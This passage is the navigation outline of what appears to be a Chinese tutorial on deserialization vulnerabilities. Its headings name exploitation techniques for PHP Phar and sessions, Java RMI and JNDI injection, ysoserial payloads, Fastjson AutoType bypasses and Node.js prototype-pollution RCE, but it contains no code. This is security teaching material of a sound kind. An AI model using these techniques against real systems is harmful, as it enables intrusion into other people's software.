href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%8E%E7%9B%AE%E5%BD%95%E5%92%8C%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">7.0.1.2.2.</span> <span class="toc-text">命名空间与目录和文件的关系</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#use%E5%85%B3%E9%94%AE%E5%AD%97%E5%BC%95%E5%85%A5%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4-10-16"><span class="toc-number">7.0.1.2.3.</span> <span class="toc-text">use关键字引入命名空间 10:16</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E9%9D%9E%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-number">7.0.1.2.4.</span> <span class="toc-text">全局非命名空间</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8"><span class="toc-number">7.0.2.</span> <span class="toc-text">PHP反序列化漏洞的高级利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E4%B8%AD%E7%9A%84Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.0.2.1.</span> <span class="toc-text">PHP中的Session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Session%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6-00-18"><span class="toc-number">7.0.2.1.1.</span> <span class="toc-text">Session中的反序列化机制 00:18</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#PHP%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E4%B8%89%E7%A7%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B9%E5%BC%8F"><span class="toc-number">7.0.2.1.2.</span> <span class="toc-text">PHP处理器的三种序列化方式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6php-ini%E4%B8%AD%E4%B8%8Esession%E5%AD%98%E5%82%A8%E9%85%8D%E7%BD%AE%E7%9B%B8%E5%85%B3%E7%9A%84%E9%87%8D%E8%A6%81%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-number">7.0.2.1.3.</span> <span class="toc-text">配置文件php.ini中与session存储配置相关的重要配置项</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">7.0.2.1.4.</span> <span class="toc-text">示例代码分析</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.0.2.2.</span> <span class="toc-text">Phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6"><span class="toc-number">7.0.2.2.1.</span> <span class="toc-text">phar文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">7.0.2.2.2.</span> <span class="toc-text">phar文件结构</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Phar%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.0.2.2.3.</span> <span class="toc-text">使用Phar类的方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Phar%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.0.2.2.4.</span> <span class="toc-text">Phar伪协议</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%EF%BC%8CJava%E4%B8%AD%E5%8F%8D%E5%B0%84%E4%B8%8E%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">8.</span> <span class="toc-text">八，Java中反射与序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Java%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-00-26"><span class="toc-number">8.0.0.1.</span> <span class="toc-text">Java反射基础知识 00:26</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E5%8F%8D%E5%B0%84%E5%BC%8F%E7%BC%96%E7%A8%8B-00-28"><span class="toc-number">8.0.0.1.1.</span> <span class="toc-text">1）反射式编程 00:28</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E5%8F%8D%E5%B0%84%E6%A0%B8%E5%BF%83%E6%96%B9%E6%B3%95-01-50"><span class="toc-number">8.0.0.1.2.</span> <span class="toc-text">2）反射核心方法 01:50</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89%E8%8E%B7%E5%8F%96%E7%B1%BB%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B9%E6%B3%95-02-42"><span class="toc-number">8.0.0.1.3.</span> <span class="toc-text">3）获取类对象的方法 02:42</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4%EF%BC%89Class-forName%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90-04-07"><span class="toc-number">8.0.0.1.4.</span> <span class="toc-text">4）Class.forName深入解析 04:07</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JVM%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B-06-03"><span class="toc-number">9.</span> <span class="toc-text">JVM类加载过程 06:03</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86-18-02"><span class="toc-number">9.0.0.1.</span> <span class="toc-text">3. Java序列化原理 18:02</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%87%BD%E6%95%B0%E5%92%8C%E5%BA%8F%E5%88%97%E5%8C%96%E5%87%BD%E6%95%B0-18-04"><span class="toc-number">9.0.0.1.1.</span> <span class="toc-text">1）反序列化函数和序列化函数 18:04</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B-18-59"><span class="toc-number">9.0.0.1.2.</span> <span class="toc-text">2）应用案例 18:59</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%A9%E7%94%A8-00-00"><span class="toc-number">9.0.1.</span> <span class="toc-text">一、Java反序列化漏洞入门利用 00:00</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-00-23"><span class="toc-number">9.0.1.1.</span> <span class="toc-text">1. 反序列化漏洞原理 00:23</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D-00-53"><span class="toc-number">9.0.1.1.1.</span> <span class="toc-text">1）反序列化漏洞原理介绍 00:53</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E9%80%9A%E8%BF%87%E8%87%AA%E5%8A%A8%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E9%93%BE%E5%BC%8F%E5%85%B3%E7%B3%BB-03-15"><span class="toc-number">9.0.1.1.2.</span> <span class="toc-text">2）通过自动存在的函数调用关系构造一个链式关系 03:15</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%9E%84%E9%80%A0Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-04-20"><span class="toc-number">9.0.1.2.</span> <span class="toc-text">2. 构造Java反序列化利用链 04:20</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89URLDNS-05-08"><span class="toc-number">9.0.1.2.1.</span> <span class="toc-text">1）URLDNS 05:08</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89CommonsCollections-13-55"><span class="toc-number">9.0.1.2.2.</span> <span class="toc-text">2）CommonsCollections 13:55</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget-chain%E4%BB%8B%E7%BB%8D-14-29"><span class="toc-number">10.</span> <span class="toc-text">Gadget chain介绍 14:29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ConstantTransformer%E4%BD%9C%E7%94%A8-16-05"><span class="toc-number">11.</span> <span class="toc-text">ConstantTransformer作用 16:05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#transformer%E8%A2%AB%E8%B0%83%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B-17-47"><span class="toc-number">12.</span> <span class="toc-text">transformer被调用的过程 17:47</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81Java%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-00-02"><span class="toc-number">12.0.1.</span> <span class="toc-text">一、Java协议中的反序列化漏洞 00:02</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-RMI%E7%AE%80%E4%BB%8B-00-11"><span class="toc-number">12.0.1.1.</span> <span class="toc-text">1. RMI简介 00:11</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AFJava-RMI-00-30"><span class="toc-number">12.0.1.1.1.</span> <span class="toc-text">1）什么是Java RMI 00:30</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89JRMP-02-06"><span class="toc-number">12.0.1.1.2.</span> <span class="toc-text">2）JRMP 02:06</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89RMI%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B-02-36"><span class="toc-number">12.0.1.1.3.</span> <span class="toc-text">3）RMI通信过程 02:36</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4%EF%BC%89RMI%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-04-55"><span class="toc-number">12.0.1.1.4.</span> <span class="toc-text">4）RMI的安全问题 04:55</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5%EF%BC%89Stub%E5%AF%B9%E8%B1%A1-06-35"><span class="toc-number">12.0.1.1.5.</span> <span class="toc-text">5）Stub对象 06:35</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6%EF%BC%89Skeleton%E5%AF%B9%E8%B1%A1-08-57"><span class="toc-number">12.0.1.1.6.</span> <span class="toc-text">6）Skeleton对象 08:57</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7%EF%BC%89RMI%E4%B8%AD%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C-10-01"><span class="toc-number">12.0.1.1.7.</span> <span class="toc-text">7）RMI中的基本操作 10:01</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#8%EF%BC%89RMI-Client%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-10-15"><span class="toc-number">12.0.1.1.8.</span> <span class="toc-text">8）RMI Client代码分析 10:15</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#9%EF%BC%89RMI-Server-Registry%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-11-41"><span class="toc-number">12.0.1.1.9.</span> <span class="toc-text">9）RMI Server &amp; Registry代码分析 11:41</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-RMI%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95-15-24"><span class="toc-number">12.0.1.2.</span> <span class="toc-text">2. RMI利用手法 15:24</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E9%92%88%E5%AF%B9%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-16-56"><span class="toc-number">12.0.1.2.1.</span> <span class="toc-text">1）针对注册中心利用方式 16:56</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E9%92%88%E5%AF%B9%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-19-26"><span class="toc-number">12.0.1.2.2.</span> <span class="toc-text">2）针对服务端利用方式 19:26</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89%E9%92%88%E5%AF%B9%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-21-13"><span class="toc-number">12.0.1.2.3.</span> <span class="toc-text">3）针对客户端利用方式 21:13</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81JNDI%E5%8D%8F%E8%AE%AE-00-23"><span class="toc-number">12.0.2.</span> <span class="toc-text">一、JNDI协议 00:23</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFJNDI-00-28"><span class="toc-number">12.0.2.1.</span> <span class="toc-text">1. 什么是JNDI 00:28</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-JNDI%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E8%BD%AC%E6%8D%A2-05-06"><span class="toc-number">12.0.2.2.</span> <span class="toc-text">2. JNDI动态协议转换 05:06</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-JNDI%E4%B8%8ERMI%E7%9A%84%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8-08-42"><span class="toc-number">12.0.2.3.</span> <span class="toc-text">3. JNDI与RMI的配合使用 08:42</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-Reference%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%8E%82%E6%9D%A5%E6%9E%84%E9%80%A0%E5%AF%B9%E8%B1%A1-11-00"><span class="toc-number">12.0.2.4.</span> <span class="toc-text">4. Reference可以使用工厂来构造对象 11:00</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-JNDI%E6%B3%A8%E5%85%A5lookup%E5%9C%B0%E5%9D%80%E5%8F%AF%E6%8E%A7%E6%97%B6%E8%BF%9B%E8%A1%8C%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-12-46"><span class="toc-number">12.0.2.5.</span> <span class="toc-text">5. JNDI注入lookup地址可控时进行的利用方式 12:46</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%9C%E7%AB%AF%E7%9A%84%E5%87%BD%E6%95%B0%E5%9C%A8%E6%9C%AC%E5%9C%B0%E8%A2%AB%E6%89%A7%E8%A1%8C%E4%BA%86-16-09"><span class="toc-number">12.0.2.6.</span> <span class="toc-text">6. 为什么远端的函数在本地被执行了 16:09</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-18-39"><span class="toc-number">12.0.3.</span> <span class="toc-text">二、ysoserial使用方法 18:39</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFysoserial-18-48"><span class="toc-number">12.0.3.1.</span> <span class="toc-text">1. 什么是ysoserial 18:48</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Payload%E6%A8%A1%E5%9D%97-19-45"><span class="toc-number">12.0.3.2.</span> <span class="toc-text">2. Payload模块 19:45</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-ysoserial%E7%94%9F%E6%88%90payload%E6%96%B9%E5%BC%8F-21-25"><span class="toc-number">12.0.3.3.</span> <span class="toc-text">3. ysoserial生成payload方式 21:25</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ysoserial-21-59"><span class="toc-number">12.0.3.4.</span> <span class="toc-text">4. 如何使用ysoserial 21:59</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81Fastjson%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-00-01"><span class="toc-number">12.0.4.</span> <span class="toc-text">一、Fastjson的反序列化漏洞 00:01</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D-00-23"><span class="toc-number">12.0.4.1.</span> <span class="toc-text">1. Fastjson反序列化原理介绍 00:23</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AFFastjson-00-32"><span class="toc-number">12.0.4.1.1.</span> <span class="toc-text">1）什么是Fastjson 00:32</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E4%B8%BA%E4%BB%80%E4%B9%88Fastjson%E4%BC%9A%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-02-36"><span class="toc-number">12.0.4.1.2.</span> <span class="toc-text">2）为什么Fastjson会有反序列化漏洞 02:36</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89fastjson%E4%B8%AD%E5%AF%B9%E4%BA%8Ejson%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A0%B8%E5%BF%83%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B%E4%BD%8D%E7%BD%AE-08-53"><span class="toc-number">12.0.4.1.3.</span> <span class="toc-text">3）fastjson中对于json数据的核心处理流程位置 08:53</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4%EF%BC%89%E5%88%9B%E5%BB%BAJavaBeanDeserializer-09-54"><span class="toc-number">12.0.4.1.4.</span> <span class="toc-text">4）创建JavaBeanDeserializer 09:54</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Fastjson%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8-12-14"><span class="toc-number">12.0.4.2.</span> <span class="toc-text">2. Fastjson的反序列化基础利用 12:14</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E6%9C%80%E5%88%9D%E7%9A%84payload%E7%A4%BA%E4%BE%8B"><span class="toc-number">12.0.4.2.1.</span> <span class="toc-text">1）最初的payload示例</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A-%E9%80%9A%E8%BF%87-type%E6%8C%87%E5%AE%9A%E6%81%B6%E6%84%8F%E7%B1%BBJdbcRowSetImpl-setDataSourceName%E8%AE%BE%E7%BD%AELDAP%E6%81%B6%E6%84%8F%E5%9C%B0%E5%9D%80-setAutoCommit-true-%E8%A7%A6%E5%8F%91connect-%E6%96%B9%E6%B3%95-connect-%E5%86%85%E9%83%A8%E8%B0%83%E7%94%A8InitialContext-lookup-%E5%AE%9E%E7%8E%B0JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">攻击链分析：  - 通过@type指定恶意类JdbcRowSetImpl  - setDataSourceName设置LDAP恶意地址  - setAutoCommit(true)触发connect()方法  - connect()内部调用InitialContext().lookup()实现JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%98%B6%E5%B1%82%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%8E%AF%E8%8A%82-00-00"><span class="toc-number">13.0.1.</span> <span class="toc-text">一、阶层反序列化漏洞的第二个环节 00:00</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%86%85%E5%AE%B9%E7%9B%AE%E5%BD%95-00-05"><span class="toc-number">13.0.1.1.</span> <span class="toc-text">1. 内容目录 00:05</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%97%A0%E9%98%B2%E6%8A%A4%E7%9A%84%E6%9C%80%E5%88%9D%E5%88%A9%E7%94%A8-00-29"><span class="toc-number">13.0.1.2.</span> <span class="toc-text">2. 无防护的最初利用 00:29</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89JdbcRowSetImpl%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="toc-number">13.0.1.2.1.</span> <span class="toc-text">1）JdbcRowSetImpl类利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E5%88%A9%E7%94%A8TemplatesImpl%E7%B1%BB-01-16"><span class="toc-number">13.0.1.2.2.</span> <span class="toc-text">2）利用TemplatesImpl类 01:16</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%A6%81%E6%B1%82%EF%BC%9A-%E7%B1%BB%E5%BF%85%E9%A1%BB%E7%BB%A7%E6%89%BF%E7%89%B9%E5%AE%9A%E6%8A%BD%E8%B1%A1%E7%B1%BB%EF%BC%88%E5%A6%82AbstractTranslet%EF%BC%89-%E9%9C%80%E8%A6%81%E9%87%8D%E5%86%99%E6%8C%87%E5%AE%9A%E7%9A%84transform%E6%96%B9%E6%B3%95-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%9A%E5%B8%B8%E6%94%BE%E5%9C%A8%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E6%88%96%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%AD"><span class="toc-number">14.</span> <span class="toc-text">关键要求：  - 类必须继承特定抽象类（如AbstractTranslet）  - 需要重写指定的transform方法  - 恶意代码通常放在构造函数或静态代码块中</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-AutoType%E9%BB%91%E5%90%8D%E5%8D%95%E5%AF%B9%E6%8A%97-03-31"><span class="toc-number">14.0.0.1.</span> <span class="toc-text">3. AutoType黑名单对抗 03:31</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E9%BB%91%E5%90%8D%E5%8D%95%E5%AF%B9%E6%8A%97%E7%AE%80%E4%BB%8B-05-56"><span class="toc-number">14.0.0.1.1.</span> <span class="toc-text">1）黑名单对抗简介 05:56</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E6%9D%A1%E4%BB%B6-%E5%BF%85%E9%A1%BB%E5%BC%80%E5%90%AFAutoType%E6%94%AF%E6%8C%81%E6%88%96%E6%8C%87%E5%AE%9AexpectClass-%E9%80%9A%E8%BF%87TypeUtils-loadClass%E5%AE%8C%E6%88%90%E6%9C%80%E7%BB%88%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">15.</span> <span class="toc-text">加载条件:  - 必须开启AutoType支持或指定expectClass  - 通过TypeUtils.loadClass完成最终类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-Class%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6"><span class="toc-number">15.0.0.1.</span> <span class="toc-text">4. Class缓存机制</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89Class%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E7%A4%BA%E4%BE%8B-08-52"><span class="toc-number">15.0.0.1.1.</span> <span class="toc-text">1）Class缓存机制绕过示例 08:52</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E5%8F%A6%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="toc-number">15.0.0.1.2.</span> <span class="toc-text">2）另一种绕过手法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%BB%A5%E5%8F%8A%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-00-08"><span class="toc-number">15.0.1.</span> <span class="toc-text">一、原型链以及原型链污染 00:08</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Javascript%E5%87%BD%E6%95%B0%E7%89%B9%E7%82%B9-00-33"><span class="toc-number">15.0.1.1.</span> <span class="toc-text">1. Javascript函数特点 00:33</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89Function%E4%BD%9C%E4%B8%BA%E7%B1%BB%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8Cnew%E6%93%8D%E4%BD%9C-02-11"><span class="toc-number">15.0.1.1.1.</span> <span class="toc-text">1）Function作为类可以进行new操作 02:11</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E5%AE%9E%E4%BE%8B%E5%AF%B9%E8%B1%A1%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7-05-13"><span class="toc-number">15.0.1.1.2.</span> <span class="toc-text">2）实例对象私有属性 05:13</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8E%9F%E5%9E%8B%E9%93%BE-09-26"><span class="toc-number">15.0.1.2.</span> <span class="toc-text">2. 原型链 09:26</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9proto%E5%BD%B1%E5%93%8D%E5%AF%B9%E8%B1%A1%E5%8F%96%E5%80%BC-13-47"><span class="toc-number">15.0.1.3.</span> <span class="toc-text">3. 修改proto影响对象取值 13:47</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%89%B9%E7%82%B9-16-07"><span class="toc-number">15.0.1.4.</span> <span class="toc-text">4. 原型链污染特点 16:07</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B-16-42"><span class="toc-number">15.0.1.5.</span> <span class="toc-text">5. 应用案例 16:42</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E4%BE%8B%E9%A2%98-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="toc-number">15.0.1.5.1.</span> <span class="toc-text">1）例题:原型链污染攻击示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81NodeJS%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-19-27"><span class="toc-number">15.0.2.</span> <span class="toc-text">二、NodeJS中的原型链模板注入 19:27</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-19-34"><span class="toc-number">15.0.2.1.</span> <span class="toc-text">1. 利用原型链模板注入 19:34</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E4%BE%8B%E9%A2%98-lodash-template%E6%B1%A1%E6%9F%93%E6%BA%90URL%E5%AE%9E%E7%8E%B0RCE-19-37"><span class="toc-number">15.0.2.1.1.</span> <span class="toc-text">1）例题:lodash.template污染源URL实现RCE 19:37</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" 